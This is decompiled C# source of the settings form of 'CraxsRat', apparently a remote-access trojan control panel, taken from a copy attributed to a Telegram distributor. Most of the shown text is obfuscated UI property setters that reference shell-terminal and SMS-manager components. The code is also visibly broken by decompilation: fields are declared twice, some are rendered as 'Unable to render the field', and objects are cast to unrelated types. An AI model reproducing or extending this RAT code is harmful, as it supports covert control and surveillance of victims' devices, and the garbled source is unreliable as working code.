// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Settings
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.My;
using Craxs_Rat.sockets;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Text;
using System.Linq;
using System.Media;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Settings : Form
  {
    public static Color DefaultColor_Background;
    public static Color DefaultColor_ColorTitles;
    public static Color DefaultColor_NewColorFiles;
    public static bool NOTI_SOUND;
    public static string FLAGS_Visible;
    public static string FLAGS_Size;
    public static string NOTI_Round;
    public static string SC_Status;
    public static string FM_IC_Size;
    public static object vRemoving_Duplicates;
    public static string ColumnsIndex;
    public static int T_Interval;
    public static Point po1;
    public static Point po2;
    public static bool multi;
    public static SoundPlayer aMedia;
    public static MultiSounds Snds;
    private static string path_File;
    public static int id;
    private Dictionary<string, string> Snds;
    private int sndcnt;
    public static Font FontDrawString;
    public static Font f;
    public static readonly string MY_Path;
    public static readonly string res_Path;
    public static readonly string res_Path_iconsapps;
    public static readonly string Storepath;
    public static readonly string Junkpath;
    public static readonly string CrashsPath;
    public static readonly string domen;
    public static readonly string users;
    public static readonly string nameRAT;
    public static StringBuilder maps;
    public static List<object> plug;
    public static string SupportedText;
    public static string SupportedImages;
    public static string SupportedVideo;
    public static byte f0053BF;
    private static PrivateFontCollection privateFonts;
    private static PrivateFontCollection privateFonts;
    [SpecialName]
    public int value__;
    public const RefreshExplorer.HChangeNotifyFlags SHCNF_DWORD = ; // Unable to render the field
    public const RefreshExplorer.HChangeNotifyFlags SHCNF_IDLIST = ; // Unable to render the field
    public const RefreshExplorer.HChangeNotifyFlags SHCNF_PATHA = ; // Unable to render the field
    public const RefreshExplorer.HChangeNotifyFlags SHCNF_PATHW = ; // Unable to render the field
    public const RefreshExplorer.HChangeNotifyFlags SHCNF_PRINTERA = ; // Unable to render the field
    public const RefreshExplorer.HChangeNotifyFlags SHCNF_PRINTERW = ; // Unable to render the field
    public const RefreshExplorer.HChangeNotifyFlags SHCNF_FLUSH = ; // Unable to render the field
    public const RefreshExplorer.HChangeNotifyFlags SHCNF_FLUSHNOWAIT = ; // Unable to render the field
    [SpecialName]
    public int value__;
    public const RefreshExplorer.HChangeNotifyEventID SHCNE_ALLEVENTS = ; // Unable to render the field
    public const RefreshExplorer.HChangeNotifyEventID SHCNE_ASSOCCHANGED = ; // Unable to render the field
    public const RefreshExplorer.HChangeNotifyEventID SHCNE_ATTRIBUTES = ; // Unable to render the field
    public const RefreshExplorer.HChangeNotifyEventID SHCNE_CREATE = ; // Unable to render the field
    public const RefreshExplorer.HChangeNotifyEventID SHCNE_DELETE = ; // Unable to render the field
    public const RefreshExplorer.HChangeNotifyEventID SHCNE_DRIVEADD = ; // Unable to render the field
    public const RefreshExplorer.HChangeNotifyEventID SHCNE_DRIVEADDGUI = ; // Unable to render the field

    internal virtual Panel Panel1
    {
      get => ((SecurityKey) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((SecurityKey) this)._Panel1 = value;
    }

    internal virtual Label Label1
    {
      get => ((SecurityKey) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((SecurityKey) this)._Label1 = value;
    }

    internal virtual DataGridView DGV0
    {
      get => ((SecurityKey) this)._DGV0;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV0_CellEnter);
label_1:
        int num1 = 622261693;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DataGridView dgV0;
          switch ((num3 = (uint) (~-~((-((1601680344 + 1193006538) * -190828517) + -(--660548429 - 265965391) ^ -1520986811 * (--2052279159 ^ -171546855 ^ -563121137 ^ -331453709 ^ 1341709242 ^ ~324501772)) - num2) - -1128802440 ^ 1831460900)) % 7U)
          {
            case 0:
              ((SecurityKey) this)._DGV0 = value;
              num1 = 1324046033;
              continue;
            case 1:
              dgV0 = ((SecurityKey) this)._DGV0;
              int num4 = dgV0 == null ? -924204651 : (num4 = -1290938451);
              num1 = num4 ^ (int) num3 * -532127151;
              continue;
            case 2:
              goto label_1;
            case 3:
              dgV0.CellEnter -= cellEventHandler;
              num1 = (int) num3 * -1514935133 ^ -1885745743;
              continue;
            case 4:
              dgV0.CellEnter += cellEventHandler;
              num1 = (int) num3 * -1498736060 ^ 80371726;
              continue;
            case 5:
              goto label_3;
            case 6:
              dgV0 = ((SecurityKey) this)._DGV0;
              int num5 = dgV0 == null ? -712184914 : (num5 = -995637925);
              num1 = num5 ^ (int) num3 * -1772565511;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DataGridView DGV1
    {
      get => ((SecurityKey) this)._DGV1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler1 = new DataGridViewCellEventHandler(this.DGV1_CellEnter);
label_1:
        int num1 = 1652168714;
        DataGridView dgV1;
        DataGridViewCellEventHandler cellEventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~-(num1 ^ --~-10906126 - -~-1660748509)) % 9U)
          {
            case 0:
              dgV1.CellEnter -= cellEventHandler1;
              dgV1.CellContentClick -= cellEventHandler2;
              num1 = (int) num2 * -1321322981 ^ 1667411282;
              continue;
            case 1:
              dgV1.CellContentClick += cellEventHandler2;
              num1 = (int) num2 * -941441555 ^ 85690675;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num3 = dgV1 == null ? 2120128935 : (num3 = 146134973);
              num1 = num3 ^ (int) num2 * 568540595;
              continue;
            case 4:
              ((SecurityKey) this)._DGV1 = value;
              dgV1 = ((SecurityKey) this)._DGV1;
              num1 = 1557784828;
              continue;
            case 5:
              cellEventHandler2 = new DataGridViewCellEventHandler(this.DGV1_CellContentClick);
              dgV1 = ((SecurityKey) this)._DGV1;
              num1 = (int) num2 * -1045136628 ^ 1217405145;
              continue;
            case 6:
              dgV1.CellEnter += cellEventHandler1;
              num1 = (int) num2 * 2018195718 ^ 653604164;
              continue;
            case 7:
              int num4 = dgV1 == null ? 790450683 : (num4 = 74919986);
              num1 = num4 ^ (int) num2 * 681564666;
              continue;
            case 8:
              goto label_1;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual Label Label2
    {
      get => ((SecurityKey) this)._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((SecurityKey) this)._Label2 = value;
    }

    internal virtual Button SV
    {
      get => ((SecurityKey) this)._SV;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SV_Click);
label_1:
        int num1 = 337940622;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Button sv;
          switch ((num3 = (uint) --((--((163329762 - 1200929129) * 2036279493) - num2 ^ ~(-(-515731298 - 486795675) - (-516976674 - -1646592094 ^ -326310883))) * 2126723961)) % 9U)
          {
            case 0:
              goto label_3;
            case 1:
              sv.Click += eventHandler;
              num1 = (int) num3 * 1266331888 ^ 45062199;
              continue;
            case 2:
              ((SecurityKey) this)._SV = value;
              num1 = -2042748690;
              continue;
            case 3:
              int num4 = sv == null ? -795577583 : (num4 = 569386154);
              num1 = num4 ^ (int) num3 * 1185828037;
              continue;
            case 4:
              int num5 = sv == null ? -1394240101 : (num5 = -1195513945);
              num1 = num5 ^ (int) num3 * -1580439396;
              continue;
            case 5:
              sv = ((SecurityKey) this)._SV;
              num1 = (int) num3 * -1283163595 ^ -38621119;
              continue;
            case 6:
              sv.Click -= eventHandler;
              num1 = (int) num3 * -2106720411 ^ 560527473;
              continue;
            case 7:
              sv = ((SecurityKey) this)._SV;
              num1 = (int) num3 * -800341103 ^ -1125616913;
              continue;
            case 8:
              goto label_1;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual Button DL
    {
      get => ((SecurityKey) this)._DL;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DL_Click);
label_1:
        int num1 = -218541676;
        Button dl;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -~(num1 ^ ((-135250937 - 1028772742 ^ 575462019) * -811377983 - ~(-1798818191 * -580064344)) * -890266165)) % 8U)
          {
            case 0:
              dl.Click -= eventHandler;
              num1 = (int) num2 * 206086046 ^ -1762509061;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              ((SecurityKey) this)._DL = value;
              dl = ((SecurityKey) this)._DL;
              num1 = -1355792433;
              continue;
            case 4:
              int num3 = dl == null ? 378260503 : (num3 = 1788310658);
              num1 = num3 ^ (int) num2 * 13034253;
              continue;
            case 5:
              dl.Click += eventHandler;
              num1 = (int) num2 * 1838907970 ^ 419228451;
              continue;
            case 6:
              dl = ((SecurityKey) this)._DL;
              num1 = (int) num2 * -1569249188 ^ 1173560346;
              continue;
            case 7:
              int num4 = dl == null ? 512170976 : (num4 = 2000591204);
              num1 = num4 ^ (int) num2 * -1033948033;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel2
    {
      get => ((SecurityKey) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((SecurityKey) this)._Panel2 = value;
    }

    internal virtual DataGridView DGV2
    {
      get => ((ShellTerminal) this)._DGV2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV2_CellEnter);
        DataGridView dgV2 = ((ShellTerminal) this)._DGV2;
        if (dgV2 == null)
          goto label_5;
label_1:
        int num1 = 1542691694;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((~(-1885706251 - -592420548) - -(~num2 * 216316729)) * -1096065567)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4 = dgV2 == null ? -1575680964 : (num4 = 734092529);
              num1 = num4 ^ (int) num3 * 979907369;
              continue;
            case 2:
              goto label_5;
            case 3:
              dgV2.CellEnter -= cellEventHandler;
              num1 = (int) num3 * -206181154 ^ -1176536301;
              continue;
            case 4:
              goto label_3;
            case 5:
              dgV2.CellEnter += cellEventHandler;
              num1 = (int) num3 * 203479053 ^ 1965555184;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_5:
        ((ShellTerminal) this)._DGV2 = value;
        dgV2 = ((ShellTerminal) this)._DGV2;
        num1 = 1079814706;
        goto label_2;
      }
    }

    internal virtual Label Label3
    {
      get => ((ShellTerminal) this)._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ShellTerminal) this)._Label3 = value;
    }

    internal virtual DataGridView DGV3
    {
      get => ((ShellTerminal) this)._DGV3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV3_CellEnter);
        DataGridView dgV3 = ((ShellTerminal) this)._DGV3;
label_1:
        int num1 = -1307387000;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((~(-(~-467439320 ^ 1991801545) - (num2 * -1671262761 - -((-1249346121 - -1633255356) * 508109655 - (~820666402 ^ ~-961245965)))) ^ 74569698 + 1558971825) - -864541028)) % 7U)
          {
            case 0:
              ((ShellTerminal) this)._DGV3 = value;
              num1 = -264142503;
              continue;
            case 1:
              dgV3.CellEnter += cellEventHandler;
              num1 = (int) num3 * 102646451 ^ -1969033170;
              continue;
            case 2:
              goto label_1;
            case 3:
              dgV3 = ((ShellTerminal) this)._DGV3;
              int num4 = dgV3 == null ? -817103055 : (num4 = -1158807139);
              num1 = num4 ^ (int) num3 * -682212765;
              continue;
            case 4:
              dgV3.CellEnter -= cellEventHandler;
              num1 = (int) num3 * 1885394840 ^ -593649989;
              continue;
            case 5:
              goto label_3;
            case 6:
              int num5 = dgV3 == null ? 2029525179 : (num5 = -1811065192);
              num1 = num5 ^ (int) num3 * -564514920;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Label Label4
    {
      get => ((ShellTerminal) this)._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ShellTerminal) this)._Label4 = value;
    }

    internal virtual DataGridView DGV4
    {
      get => ((ShellTerminal) this)._DGV4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV4_CellEnter);
        DataGridView dgV4 = ((ShellTerminal) this)._DGV4;
label_1:
        int num1 = 607232042;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (1480197583 - (num2 + (1319740472 * -1684392815 - -(253137391 ^ -1138900539 * --820058531)) + (-(1381818005 - 1272307327) + ~235896440 ^ 133089541 * 494871286 * 1023007385 + (1916138131 + 1934495053 ^ -1596669009 - 916205172))))) % 8U)
          {
            case 0:
              ((ShellTerminal) this)._DGV4 = value;
              num1 = -1292375200;
              continue;
            case 1:
              goto label_3;
            case 2:
              dgV4.CellEnter -= cellEventHandler;
              num1 = (int) num3 * 1559010215 ^ -2145660271;
              continue;
            case 3:
              goto label_1;
            case 4:
              int num4 = dgV4 == null ? 678606142 : (num4 = 2018730785);
              num1 = num4 ^ (int) num3 * 218349750;
              continue;
            case 5:
              int num5 = dgV4 == null ? 1649094707 : (num5 = 1712430113);
              num1 = num5 ^ (int) num3 * -1577605356;
              continue;
            case 6:
              dgV4.CellEnter += cellEventHandler;
              num1 = (int) num3 * -506915518 ^ 1318398746;
              continue;
            case 7:
              dgV4 = ((ShellTerminal) this)._DGV4;
              num1 = (int) num3 * 1687236701 ^ 2048644416;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label Label5
    {
      get => ((ShellTerminal) this)._Label5;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ShellTerminal) this)._Label5 = value;
    }

    internal virtual DataGridView DGV5
    {
      get => ((ShellTerminal) this)._DGV5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler1 = new DataGridViewCellEventHandler(this.DGV5_CellEnter);
        DataGridViewCellEventHandler cellEventHandler2 = new DataGridViewCellEventHandler(this.DGV5_CellContentClick);
        DataGridView dgV5 = ((ShellTerminal) this)._DGV5;
label_1:
        int num1 = -1687708676;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-44151754 * -1896451549 - (num2 ^ -(~(581814480 - 1924368301) + -628710589 * (-1037805017 * 1426983475)) + (~1614875274 + (669001595 - 1995921624) + -(1046980988 - 1918282613) - 1145989178) ^ -1074125526))) % 10U)
          {
            case 0:
              dgV5.CellContentClick += cellEventHandler2;
              num1 = (int) num3 * -1492493920 ^ 479724336;
              continue;
            case 1:
              dgV5.CellEnter -= cellEventHandler1;
              num1 = (int) num3 * -152762573 ^ -238516702;
              continue;
            case 2:
              int num4 = dgV5 == null ? -11511753 : (num4 = 372611793);
              num1 = num4 ^ (int) num3 * -1179477276;
              continue;
            case 3:
              dgV5 = ((ShellTerminal) this)._DGV5;
              num1 = (int) num3 * -485976486 ^ 1410242528;
              continue;
            case 4:
              int num5 = dgV5 == null ? -1765479850 : (num5 = 248447943);
              num1 = num5 ^ (int) num3 * -391589549;
              continue;
            case 5:
              ((ShellTerminal) this)._DGV5 = value;
              num1 = 95847349;
              continue;
            case 6:
              goto label_3;
            case 7:
              dgV5.CellContentClick -= cellEventHandler2;
              num1 = (int) num3 * 1134766386 ^ -2038406691;
              continue;
            case 8:
              goto label_1;
            case 9:
              dgV5.CellEnter += cellEventHandler1;
              num1 = (int) num3 * 1048642805 ^ -1886968713;
              continue;
            default:
              goto label_12;
          }
        }
label_3:
        return;
label_12:;
      }
    }

    internal virtual Label Label6
    {
      get => ((ShellTerminal) this)._Label6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ShellTerminal) this)._Label6 = value;
    }

    internal virtual Timer TOpacity
    {
      get => ((ShellTerminal) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
        Timer topacity = ((ShellTerminal) this)._TOpacity;
label_1:
        int num1 = 1705867146;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((((num1 + (~(240124177 * 2030499358 + (215948095 + (517167012 ^ -406476911))) ^ (-1321356039 * ~1300044320 ^ 598116707 * ~164420018) + -(461816215 * 800499900 + ~-1358308914))) * -232346777 ^ ~(1515484590 + 710483008 - -746057913)) + (1427916 ^ -938920439 * -1984818174)) * 634354435)) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * -845166227 ^ -1193258347;
              continue;
            case 2:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * 732674361 ^ 944554211;
              continue;
            case 3:
              goto label_1;
            case 4:
              int num3 = topacity == null ? -2102678251 : (num3 = 719213062);
              num1 = num3 ^ (int) num2 * 334306403;
              continue;
            case 5:
              ((ShellTerminal) this)._TOpacity = value;
              topacity = ((ShellTerminal) this)._TOpacity;
              int num4;
              num1 = num4 = topacity == null ? 1421034354 : (num4 = 1093503207);
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual DataGridView DGV6
    {
      get => ((ShellTerminal) this)._DGV6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV6_CellEnter);
        DataGridView dgV6 = ((ShellTerminal) this)._DGV6;
        if (dgV6 == null)
          goto label_6;
label_1:
        int num1 = -1549153167;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -((-(num1 * 1015129995) ^ 472401426) * 110550279)) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              dgV6.CellEnter -= cellEventHandler;
              num1 = (int) num2 * -79906536 ^ -83644382;
              continue;
            case 2:
              dgV6.CellEnter += cellEventHandler;
              num1 = (int) num2 * 650675781 ^ 229783488;
              continue;
            case 3:
              dgV6 = ((ShellTerminal) this)._DGV6;
              int num3 = dgV6 == null ? -812811535 : (num3 = -464638293);
              num1 = num3 ^ (int) num2 * 1773220435;
              continue;
            case 4:
              goto label_6;
            case 5:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_6:
        ((ShellTerminal) this)._DGV6 = value;
        num1 = -959245361;
        goto label_2;
      }
    }

    internal virtual Label Label7
    {
      get => ((ShellTerminal) this)._Label7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ShellTerminal) this)._Label7 = value;
    }

    internal virtual DataGridView DGV7
    {
      get => ((ShellTerminal) this)._DGV7;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV7_CellEnter);
label_1:
        int num1 = -1568115320;
        DataGridView dgV7;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~(num1 * -1556984141) ^ -(-1564346017 ^ -777586455) + -484137629) * 171106789 * 490559641 ^ 236406305)) % 8U)
          {
            case 0:
              dgV7.CellEnter += cellEventHandler;
              num1 = (int) num2 * 1581898256 ^ 483583873;
              continue;
            case 1:
              dgV7.CellEnter -= cellEventHandler;
              num1 = (int) num2 * 1509506331 ^ -561952201;
              continue;
            case 2:
              int num3 = dgV7 == null ? 1702702225 : (num3 = -1019507451);
              num1 = num3 ^ (int) num2 * 1523096488;
              continue;
            case 3:
              dgV7 = ((ShellTerminal) this)._DGV7;
              num1 = (int) num2 * -87278476 ^ -2080374017;
              continue;
            case 4:
              goto label_3;
            case 5:
              goto label_1;
            case 6:
              int num4 = dgV7 == null ? -1746676654 : (num4 = -916264520);
              num1 = num4 ^ (int) num2 * 1930888761;
              continue;
            case 7:
              ((ShellTerminal) this)._DGV7 = value;
              dgV7 = ((ShellTerminal) this)._DGV7;
              num1 = -890325609;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label Label8
    {
      get => ((ShellTerminal) this)._Label8;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ShellTerminal) this)._Label8 = value;
    }

    internal virtual DataGridView DGV8
    {
      get => ((ShellTerminal) this)._DGV8;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV8_CellEnter);
        DataGridView dgV8 = ((ShellTerminal) this)._DGV8;
label_1:
        int num1 = 822030962;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~~(-649940154 - -520839125 + (90448116 - 247433436) - (num2 + ~(-(-340179581 * 74392147 + 287178869) - (~(834042207 * -1415022015) - --1176475717 * -1992698439)) - (-(-1602666923 * 924546509 ^ -424767519 - 1125241478) + (92651895 * (2057809945 * 1571608801) ^ --610720403 + ~727445909))) * 1483997333)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              dgV8.CellEnter -= cellEventHandler;
              num1 = (int) num3 * 2080129173 ^ 840295450;
              continue;
            case 3:
              ((ShellTerminal) this)._DGV8 = value;
              dgV8 = ((ShellTerminal) this)._DGV8;
              int num4;
              num1 = num4 = dgV8 == null ? 918623702 : (num4 = 2083145237);
              continue;
            case 4:
              dgV8.CellEnter += cellEventHandler;
              num1 = (int) num3 * -1101743377 ^ -1513583896;
              continue;
            case 5:
              int num5 = dgV8 == null ? 575957778 : (num5 = -1424519913);
              num1 = num5 ^ (int) num3 * 1094580130;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual Label Label9
    {
      get => ((ShellTerminal) this)._Label9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ShellTerminal) this)._Label9 = value;
    }

    internal virtual DataGridView DGV9
    {
      get => ((ShellTerminal) this)._DGV9;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGV9_CellEnter);
label_1:
        int num1 = -176596724;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DataGridView dgV9;
          switch ((num3 = (uint) (-1981054649 * 1647654206 * 250521007 - (num2 * -1356037007 ^ ~-(1135227163 * 1714864939) + 178865329))) % 9U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              int num4 = dgV9 == null ? -1333069831 : (num4 = 2084679568);
              num1 = num4 ^ (int) num3 * -191376504;
              continue;
            case 3:
              ((ShellTerminal) this)._DGV9 = value;
              num1 = -897483988;
              continue;
            case 4:
              dgV9.CellEnter += cellEventHandler;
              num1 = (int) num3 * 1556960864 ^ 506050299;
              continue;
            case 5:
              dgV9 = ((ShellTerminal) this)._DGV9;
              num1 = (int) num3 * 750449456 ^ 1327267408;
              continue;
            case 6:
              dgV9.CellEnter -= cellEventHandler;
              num1 = (int) num3 * 664481504 ^ -919572815;
              continue;
            case 7:
              int num5 = dgV9 == null ? -121085180 : (num5 = -1160073004);
              num1 = num5 ^ (int) num3 * -1557752369;
              continue;
            case 8:
              dgV9 = ((ShellTerminal) this)._DGV9;
              num1 = (int) num3 * -1615876434 ^ -565224614;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual Label Label10
    {
      get => ((ShellTerminal) this)._Label10;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((ShellTerminal) this)._Label10 = value;
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn9
    {
      get => ((ShellTerminal) this)._DataGridViewTextBoxColumn9;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((ShellTerminal) this)._DataGridViewTextBoxColumn9 = value;
      }
    }

    internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn8
    {
      get => ((SMSManager) this)._DataGridViewComboBoxColumn8;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewComboBoxColumn8 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn8
    {
      get => ((SMSManager) this)._DataGridViewTextBoxColumn8;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewTextBoxColumn8 = value;
      }
    }

    internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn7
    {
      get => ((SMSManager) this)._DataGridViewComboBoxColumn7;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewComboBoxColumn7 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn7
    {
      get => ((SMSManager) this)._DataGridViewTextBoxColumn7;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewTextBoxColumn7 = value;
      }
    }

    internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn6
    {
      get => ((SMSManager) this)._DataGridViewComboBoxColumn6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewComboBoxColumn6 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn6
    {
      get => ((SMSManager) this)._DataGridViewTextBoxColumn6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewTextBoxColumn6 = value;
      }
    }

    internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn5
    {
      get => ((SMSManager) this)._DataGridViewComboBoxColumn5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewComboBoxColumn5 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn5
    {
      get => ((SMSManager) this)._DataGridViewTextBoxColumn5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewTextBoxColumn5 = value;
      }
    }

    internal virtual DataGridViewImageColumn Column3
    {
      get => ((SMSManager) this)._Column3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((SMSManager) this)._Column3 = value;
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn4
    {
      get => ((SMSManager) this)._DataGridViewTextBoxColumn4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewTextBoxColumn4 = value;
      }
    }

    internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn4
    {
      get => ((SMSManager) this)._DataGridViewComboBoxColumn4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewComboBoxColumn4 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn3
    {
      get => ((SMSManager) this)._DataGridViewTextBoxColumn3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewTextBoxColumn3 = value;
      }
    }

    internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn3
    {
      get => ((SMSManager) this)._DataGridViewComboBoxColumn3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewComboBoxColumn3 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn2
    {
      get => ((SMSManager) this)._DataGridViewTextBoxColumn2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewTextBoxColumn2 = value;
      }
    }

    internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn2
    {
      get => ((SMSManager) this)._DataGridViewComboBoxColumn2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewComboBoxColumn2 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn1
    {
      get => ((SMSManager) this)._DataGridViewTextBoxColumn1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewTextBoxColumn1 = value;
      }
    }

    internal virtual DataGridViewComboBoxColumn DataGridViewComboBoxColumn1
    {
      get => ((SMSManager) this)._DataGridViewComboBoxColumn1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((SMSManager) this)._DataGridViewComboBoxColumn1 = value;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column1
    {
      get => ((SMSManager) this)._Column1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((SMSManager) this)._Column1 = value;
    }

    internal virtual DataGridViewComboBoxColumn Column2
    {
      get => ((SMSManager) this)._Column2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((SMSManager) this)._Column2 = value;
    }

    internal virtual ContextMenuStrip ctxPacket
    {
      get => ((SMSManager) this)._ctxPacket;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((SMSManager) this)._ctxPacket = value;
    }

    internal virtual ToolStripMenuItem DefaultToolStripMenuItem
    {
      get => ((SMSManager) this)._DefaultToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
